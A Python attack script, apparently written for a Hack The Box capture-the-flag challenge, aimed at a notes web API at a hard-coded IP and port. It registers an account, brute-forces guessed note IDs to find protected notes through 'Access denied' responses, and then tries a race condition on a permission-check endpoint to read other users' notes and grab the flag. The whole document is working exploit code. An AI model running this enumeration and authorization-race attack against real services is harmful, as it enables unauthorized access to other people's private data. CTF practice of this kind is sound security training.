#!/usr/bin/env python3
import requests
import time
import itertools

BASE_URL = "http://83.136.255.203:47148"

# Register
email = f"comprehensive_{int(time.time()*1000)}@htb.com"
r = requests.post(f"{BASE_URL}/api/auth/register",
                 json={"email": email, "password": "test"})
TOKEN = r.json()['token']
headers = {"Authorization": f"Bearer {TOKEN}"}

my_note = requests.get(f"{BASE_URL}/api/notes", headers=headers).json()['notes'][0]['id']

print(f"[*] User: {email}")
print(f"[*] My note: {my_note}\n")

# Generate comprehensive ID list
ids_to_test = []

# Common words
words = ["admin", "flag", "secret", "system", "root", "htb", "challenge",
         "celestial", "scribe", "d3vnu11", "hidden", "note"]

# Combinations
for w in words:
    ids_to_test.append(w)
    ids_to_test.append(w.upper())
    ids_to_test.append(w.capitalize())

# Two-word combinations
for w1, w2 in itertools.combinations(words, 2):
    ids_to_test.append(f"{w1}-{w2}")
    ids_to_test.append(f"{w1}_{w2}")
    ids_to_test.append(f"{w1}{w2}")

# Prefixes/suffixes
for w in ["flag", "secret", "admin"]:
    for suffix in ["1", "2", "2024", "2025", "final", "real", "actual"]:
        ids_to_test.append(f"{w}-{suffix}")
        ids_to_test.append(f"{w}_{suffix}")

print(f"[*] Testing {len(ids_to_test)} IDs...")

# First pass: find which ones exist (return "Access denied")
existing = []
for test_id in ids_to_test[:100]:  # Limit to first 100
    r = requests.get(f"{BASE_URL}/api/notes/{test_id}", headers=headers)
    try:
        data = r.json()
        if data.get('error') == 'Access denied':
            existing.append(test_id)
            print(f"  [+] EXISTS: {test_id}")
    except:
        pass

print(f"\n[*] Found {len(existing)} existing protected notes")
print(f"[*] Attempting race condition on existing notes...")

# Try race condition on existing ones
for target in existing:
    print(f"\n  Target: {target}")
    for i in range(10):
        requests.get(f"{BASE_URL}/api/notes/{my_note}/check-permission", headers=headers)
        r = requests.get(f"{BASE_URL}/api/notes/{target}", headers=headers)
        try:
            data = r.json()
            if data.get('success'):
                content = data.get('note', {}).get('content', '')
                print(f"    [+] SUCCESS: {content}")
                if 'HTB{' in content:
                    print(f"\n[!!!] FLAG: {content}\n")
                    exit(0)
                break
        except:
            pass

print("\n[*] No flag found")
